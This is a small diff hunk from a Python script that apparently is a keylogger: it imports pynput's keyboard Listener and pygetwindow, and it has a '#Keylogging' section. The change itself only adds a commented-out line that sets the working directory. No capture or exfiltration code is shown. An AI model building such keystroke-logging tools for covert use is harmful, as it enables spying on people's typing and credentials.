@@ -6,6 +6,9 @@ import pygetwindow as gw
 import sys
 from pynput.keyboard import Key, Listener
 
+#USE THIS TO SET CURRENT DIRECTORY TO THIS FILE
+#os.chdir(os.path.dirname(os.path.abspath(__file__)))
+
 #Keylogging
 filepath = ''
 file_name = ''
